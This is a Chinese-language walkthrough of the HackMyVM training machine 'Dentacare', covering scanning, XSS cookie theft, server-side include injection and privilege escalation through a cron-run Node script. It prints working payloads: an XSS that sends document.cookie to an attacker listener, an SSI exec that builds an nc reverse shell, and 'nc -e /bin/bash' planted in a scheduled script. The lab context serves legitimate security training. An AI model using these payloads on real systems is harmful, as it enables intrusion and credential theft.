---
title: Dentacare
author: hgbe02
date: 2024-05-28
categories: [Training platform,Hackmyvm]  
tags: [Hackmyvm,web]  
permalink: "/Hackmyvm/Dentacare.html"
---

# Dentacare

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405282101678.png" alt="image-20240528145900670" style="zoom: 50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405282101681.png" alt="image-20240528183651591" style="zoom:50%;" />

## 信息搜集

### 端口扫描

```bash
┌──(kali💀kali)-[~/temp/dentacare]
└─$ rustscan -a 172.20.10.4 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 172.20.10.4:22
Open 172.20.10.4:80
Open 172.20.10.4:8000
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 e7:ce:f2:f6:5d:a7:47:5a:16:2f:90:07:07:33:4e:a9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLuHH80SwA8Qff3pGOY4aBesL0Aeesw6jqX+pbtR9O7w8jlbyNhuHmjjABb/34BxFp2oBx8o5xuZVXS1cE9nAlE=
|   256 09:db:b7:e8:ee:d4:52:b8:49:c3:cc:29:a5:6e:07:35 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICKFE9s2IvPGAJ7Pt0kSC8t9OXYUrueJQQplSC2wbYtY
80/tcp   open  http    syn-ack Werkzeug/3.0.2 Python/3.11.2
|_http-title: DentaCare Corporation
|_http-server-header: Werkzeug/3.0.2 Python/3.11.2
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.2 Python/3.11.2
|     Date: Tue, 28 May 2024 10:37:48 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 43069
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <title>DentaCare Corporation</title>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
|     <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,500,600,700" rel="stylesheet">
|     <link rel="stylesheet" href="../static/css/open-iconic-bootstrap.min.css">
|     <link rel="stylesheet" href="../static/css/animate.css">
|     <link rel="stylesheet" href="../static/css/owl.carousel.min.css">
|     <link rel="stylesheet" href="../static/css/owl.theme.default.min.css">
|     <link rel="stylesheet" href="../static/css/magnific-popup.css">
|     <link rel="stylesheet" href="../static/css/aos.css">
|     <lin
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.2 Python/3.11.2
|     Date: Tue, 28 May 2024 10:37:48 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, HEAD, OPTIONS
|     Content-Length: 0
|     Connection: close
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
8000/tcp open  http    syn-ack Apache httpd 2.4.57
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: 403 Forbidden
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.94SVN%I=7%D=5/28%Time=6655B3FB%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,A8ED,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.2\x
SF:20Python/3\.11\.2\r\nDate:\x20Tue,\x2028\x20May\x202024\x2010:37:48\x20
SF:GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\
SF:x2043069\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20la
SF:ng=\"en\">\n\x20\x20<head>\n\x20\x20\x20\x20<title>DentaCare\x20Corpora
SF:tion</title>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20
SF:\x20<meta\x20name=\"viewport\"\x20content=\"width=device-width,\x20init
SF:ial-scale=1,\x20shrink-to-fit=no\">\n\x20\x20\x20\x20<link\x20href=\"ht
SF:tps://fonts\.googleapis\.com/css\?family=Open\+Sans:300,400,500,600,700
SF:\"\x20rel=\"stylesheet\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\
SF:x20href=\"\.\./static/css/open-iconic-bootstrap\.min\.css\">\n\x20\x20\
SF:x20\x20<link\x20rel=\"stylesheet\"\x20href=\"\.\./static/css/animate\.c
SF:ss\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"\.\./stati
SF:c/css/owl\.carousel\.min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"styles
SF:heet\"\x20href=\"\.\./static/css/owl\.theme\.default\.min\.css\">\n\x20
SF:\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"\.\./static/css/magni
SF:fic-popup\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=
SF:\"\.\./static/css/aos\.css\">\n\x20\x20\x20\x20<lin")%r(HTTPOptions,C7,
SF:"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.2\x20Python/3\.11\
SF:.2\r\nDate:\x20Tue,\x2028\x20May\x202024\x2010:37:48\x20GMT\r\nContent-
SF:Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20GET,\x20HEAD,\x20OPTI
SF:ONS\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(RTSPReq
SF:uest,16C,"<!DOCTYPE\x20HTML>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<h
SF:ead>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20
SF:\x20\x20\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\
SF:x20\x20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0<h1>Error\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x
SF:20code:\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\
SF:x20request\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x2
SF:0\x20\x20<p>Error\x20code\x20explanation:\x20400\x20-\x20Bad\x20request
SF:\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x20\x20</body
SF:>\n</html>\n");
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 目录扫描

```bash
┌──(kali💀kali)-[~/temp/dentacare]
└─$ gobuster dir -u http://172.20.10.4/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt            
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.20.10.4/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/blog                 (Status: 200) [Size: 23021]
/about                (Status: 200) [Size: 22975]
/contact              (Status: 500) [Size: 27322]
/services             (Status: 200) [Size: 21296]
/admin                (Status: 302) [Size: 189] [--> /]
/comment              (Status: 405) [Size: 153]
Progress: 3573 / 220561 (1.62%)
[!] Keyboard interrupt detected, terminating.
Progress: 3574 / 220561 (1.62%)
[ERROR] Get "http://172.20.10.4/Desktops": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://172.20.10.4/newyork": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://172.20.10.4/termsofservice": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://172.20.10.4/530": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://172.20.10.4/az": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
===============================================================
Finished
===============================================================
```

扫不了，另寻他法吧。。。

## 漏洞发现

### 踩点

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405282101683.png" alt="image-20240528184119391" style="zoom:50%;" />

发现存在疑似域名解析`Dentacare.hmv`，尝试进行配置：

```apl
172.20.10.4   dentacare.hmv
```

查看其他配置：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405282101684.png" alt="image-20240528184454756" style="zoom:50%;" />

### 信息搜集

#### 框架漏洞

先查看一下相关漏洞：

```bash
┌──(kali💀kali)-[~/temp/dentacare]
└─$ searchsploit flask 3.0.2             
Exploits: No Results
Shellcodes: No Results
```

暂无可以利用的，尝试`google`一下，也没发现啥。

查看一下是否开启了`debug`模式：https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405282101685.png" alt="image-20240528184842078" style="zoom: 33%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405282101686.png" alt="image-20240528184829657" style="zoom:50%;" />

确实开启了，等下可以尝试利用一下。

#### FUZZ

先fuzz一下域名及目录，不知道有无可以进行利用的，但是fuzz也被拦了，太慢了。

### 8000端口

尝试看一下是否存在有相关出路：

```bash
┌──(kali💀kali)-[~/temp/dentacare]
└─$ curl http://172.20.10.4:8000/
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.57 (Debian) Server at 172.20.10.4 Port 8000</address>
</body></html>
```

### 尝试爆破pin

尝试一下这个脚本：

```bash
import hashlib
from itertools import chain
probably_public_bits = [
    'dentacare',  # username
    'flask.app',  # modname
    'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/opt/appli/env/lib/python3.11/site-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
    '279275995014060',  # str(uuid.getnode()),  /sys/class/net/ens33/address
    'd4e6cb65d59544f3331ea0425dc555a1'  # get_machine_id(), /etc/machine-id
]

# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

先找一下是否存在相关信息的内容，找到几个用户名：

```apl
green
admin
tom
mark
mark
patrick
lvan
dentacare
```

然后找到了目录`/opt/appli/env/lib/python3.11/site-packages/flask/app.py`：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405282101687.png" alt="image-20240528194649962" style="zoom:33%;" />

还发现了一个目录穿越：

![image-20240528191217507](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405282101688.png)

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405282101689.png" alt="image-20240528191249822" style="zoom:50%;" />

但是其他的文件无法进行配置读取。可以参考`zeug`靶场，尝试进行破解，但是我这边偷看了一下wp发现不是这个思路（这个思路下的靶机可能需要重新导入靶机，修改mac地址，否则即使可以rce也出不来，所以我就偷看了一下）

### XSS进行利用（正确思路）

这确实没想到：

![image-20240528193550258](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405282101690.png)

尝试[窃取cookie](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting#retrieve-cookies)：

```bash
<img src=x onerror=this.src="http://172.20.10.8:8888/?c="+document.cookie>
```

然后接收，耐心等待一会即可收到：

```bash
┌──(kali💀kali)-[~/temp/dentacare]
└─$ python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
172.20.10.4 - - [28/May/2024 07:50:03] "GET /?c=Authorization=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpc3MiOiJEZW50YUNhcmUgQ29ycG9yYXRpb24gIiwiaWF0IjoxNzEyNTc0NTEyLCJleHAiOjE3NDQxMTA1MTIsImF1ZCI6ImRlbnRhY2FyZS5obXYiLCJzdWIiOiJoZWxwZGVza0BkZW50YWNhcmUuaG12IiwiR2l2ZW5OYW1lIjoiUGF0cmljayIsIlN1cm5hbWUiOiJQZXRpdCIsIkVtYWlsIjoiYWRtaW5AZGVudGFjYXJlLmhtdiIsIlJvbGUiOlsiQWRtaW5pc3RyYXRvciIsIlByb2plY3QgQWRtaW5pc3RyYXRvciJdfQ.FIMxmUCOL3a4ThN5z-7VDN8OxBK7W0krHlcVktAiZtx3KXSQsbno1q1MRUL9JMPTJeqoTr-bRL2KWyr5Kv7JnQ HTTP/1.1" 200 -
```

### 替换cookie登录

尝试进行替换`cookie`登录之前那个`8000`端口：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405282101692.png" alt="image-20240528195456197" style="zoom:50%;" />

### 反弹shell

先试探一下这个玩意是否可以执行命令！

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405282101693.png" alt="image-20240528195626967" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405282101694.png" alt="image-20240528200104764" style="zoom: 33%;" />

发现文件格式为`shtml`，尝试查看一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405282101695.png" alt="image-20240528200215774" style="zoom: 50%;" />

继续查看：https://book.hacktricks.xyz/pentesting-web/server-side-inclusion-edge-side-inclusion-injection#server-side-inclusion-basic-information

发现存在反弹shell方法：

```
<!--#exec cmd="mkfifo /tmp/foo;nc 172.20.10.8 1234 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405282101696.png" alt="image-20240528200729844" style="zoom:33%;" />

弹过来了！

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405282101697.png" alt="image-20240528200745635" style="zoom:50%;" />

## 提权

### 信息搜集

```bash
(remote) www-data@dentacare:/var/www/html$ whoami;id
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
(remote) www-data@dentacare:/var/www/html$ ls -la
total 28
drwxr-xr-x 2 www-data www-data 4096 Apr 14 08:02 .
drwxr-xr-x 3 root     root     4096 Apr  9 19:08 ..
-rw-r--r-- 1 root     root      537 Apr 14 08:01 .htaccess
-rw-r--r-- 1 www-data www-data  268 Apr 12 20:04 gen.php
-rw-r--r-- 1 www-data www-data  347 Apr 12 20:04 index.shtml
-rw-r--r-- 1 www-data www-data  183 May 28 14:07 patient_name.shtml
-rw-r--r-- 1 www-data www-data   95 Apr 12 20:04 process.php
(remote) www-data@dentacare:/var/www/html$ cat gen.php 
<?php

$userCommand = $_GET['cmd'] ?? 'echo Pas de commande spécifiée';

file_put_contents('patient_name.shtml', "<html><body><h1>Patient with unpaid balance added to database :</h1>\"$userCommand\"</body></html>");

header("Location: patient_name.shtml");
exit;
?>
(remote) www-data@dentacare:/var/www/html$ cat process.php 
<?php
$userInput = $_GET['query'] ?? '';

header("Location: hello.shtml?$userInput");
exit;
?>
(remote) www-data@dentacare:/var/www/html$ sudo -l
[sudo] password for www-data: 
sudo: a password is required
(remote) www-data@dentacare:/var/www/html$ crontab -l
no crontab for www-data
(remote) www-data@dentacare:/var/www/html$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:101:109:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
dentist:x:1000:1000:,,,:/home/dentist:/bin/bash
(remote) www-data@dentacare:/var/www/html$ cat /etc/cron*
cat: /etc/cron.d: Is a directory
cat: /etc/cron.daily: Is a directory
cat: /etc/cron.hourly: Is a directory
cat: /etc/cron.monthly: Is a directory
cat: /etc/cron.weekly: Is a directory
cat: /etc/cron.yearly: Is a directory
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
#
(remote) www-data@dentacare:/var/www/html$ cd /home/dentist/
bash: cd: /home/dentist/: Permission denied
(remote) www-data@dentacare:/var/www/html$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/passwd
/usr/bin/su
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/mount
/usr/lib/authbind/helper
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
(remote) www-data@dentacare:/var/www/html$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/ping cap_net_raw=ep
```

尝试甩`linpeas.sh`进去以及`pspy64`：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405282101698.png" alt="image-20240528202035848" style="zoom:50%;" />

`pspy64`一直出错，只能手动查了：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405282101699.png" alt="image-20240528203125629" style="zoom:50%;" />

发现存在定时任务，且具有写的权限：

```bash
(remote) www-data@dentacare:/tmp$ ls -l /opt/appli/.config/read_comment.js
-rw-r--r-- 1 www-data www-data 1063 Apr 12 20:04 /opt/appli/.config/read_comment.js
```

尝试反弹shell：

```bash
require('child_process').exec('nc -e /bin/bash 192.168.0.143 1234')
```

```bash
(remote) www-data@dentacare:/tmp$ cd /opt/appli/.config/
(remote) www-data@dentacare:/opt/appli/.config$ cat read_comment.js 
const puppeteer = require('puppeteer');

(async () => {
    const browser = await puppeteer.launch({
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox']
    });
    const page = await browser.newPage();

    const cookies = [{
        'name': 'Authorization',
        'value': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpc3MiOiJEZW50YUNhcmUgQ29ycG9yYXRpb24gIiwiaWF0IjoxNzEyNTc0NTEyLCJleHAiOjE3NDQxMTA1MTIsImF1ZCI6ImRlbnRhY2FyZS5obXYiLCJzdWIiOiJoZWxwZGVza0BkZW50YWNhcmUuaG12IiwiR2l2ZW5OYW1lIjoiUGF0cmljayIsIlN1cm5hbWUiOiJQZXRpdCIsIkVtYWlsIjoiYWRtaW5AZGVudGFjYXJlLmhtdiIsIlJvbGUiOlsiQWRtaW5pc3RyYXRvciIsIlByb2plY3QgQWRtaW5pc3RyYXRvciJdfQ.FIMxmUCOL3a4ThN5z-7VDN8OxBK7W0krHlcVktAiZtx3KXSQsbno1q1MRUL9JMPTJeqoTr-bRL2KWyr5Kv7JnQ',
        'url': 'http://localhost:80'
    }];

    await page.setCookie(...cookies);

    await page.goto('http://localhost:80/view-all-comments');

    console.log(`Page visitée avec cookie spécifié à ${new Date().toISOString()}`);

    await page.waitForTimeout(10000);

    await browser.close();
})();
(remote) www-data@dentacare:/opt/appli/.config$ cp read_comment.js read_comment.js.bak
(remote) www-data@dentacare:/opt/appli/.config$ echo 'require("child_process").exec("nc -e /bin/bash 172.20.10.8 2345")' > read_comment.js
```

![image-20240528204229504](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405282101700.png)

弹回来了！和作者做法截然不一样，理想解法可以参考作者的wp，下面第一个。

## 参考

https://www.youtube.com/watch?v=PPJOF-89KLQ

https://www.bilibili.com/video/BV1Ti421S7tt/

http://162.14.82.114/index.php/471/03/28/2024/

https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug